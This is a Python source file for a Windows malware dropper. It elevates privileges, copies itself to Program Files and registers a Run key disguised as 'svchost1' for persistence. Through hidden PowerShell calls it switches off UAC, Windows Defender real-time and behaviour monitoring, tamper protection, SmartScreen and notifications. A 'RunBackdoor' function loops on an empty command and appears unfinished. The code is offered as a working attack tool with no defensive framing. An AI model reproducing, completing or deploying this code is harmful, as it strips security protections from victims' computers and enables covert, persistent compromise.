from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW 
from elevate import elevate
from shutil import copyfile
from os.path import exists
from time import sleep
from os import getenv
from sys import argv
from winreg import *

def InjectingPowerShell():

    startupinfo = STARTUPINFO()
    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = SW_HIDE

    Popen("powershell Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"EnableLUA\" -Value 0 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\" -Value 0 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableRealtimeMonitoring\" -Value 1 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" -Name \"SpynetReporting\" -Value 0 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" -Name \"SubmitSamplesConsent\" -Value 2 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"ControlledFolderAccessEnabled\" -Value 0 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost\" -Name \"EnableWebContentEvaluation\" -Value 0 -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\" -Name \"SmartScreenEnabled\" -Value \"Off\" -Force", startupinfo=startupinfo, shell=False)
    Popen("powershell Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\" -Name \"NOC_GLOBAL_SETTING_TOASTS_ENABLED\" -Value 0 -Force", startupinfo=startupinfo, shell=False)

def CopyToSystem():
    mainDisk = str(getenv("SystemDrive"))
    path1 = mainDisk + "\\Program Files\\" + argv[0].split("\\")[-1]

    key2 = OpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

    if not exists(path1):
        copyfile(argv[0], path1)

        try:
            data2, index2 = QueryValueEx(key2, "svchost1")
        except FileNotFoundError:
            SetValueEx(key2, "svchost1", 0, REG_SZ, path1)
            CloseKey(key2)
    else:
        try:
            data3, index3 = QueryValueEx(key2, "svchost1")
        except FileNotFoundError:
            SetValueEx(key2, "svchost1", 0, REG_SZ, path1)
            CloseKey(key2)

    CloseKey(key2)

def DisableProtection():

    key1 = OpenKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

    data1, index1 = QueryValueEx(key1, "EnableLUA")

    if str(data1) == "1":
        InjectingPowerShell()
    else:
        pass

    CloseKey(key1)

def RunBackdoor():
    while True:
        Popen("")
        sleep(15)

def mainFunction():
    try:
        elevate()
        CopyToSystem()
        DisableProtection()
    except OSError:
        raise SystemExit

mainFunction()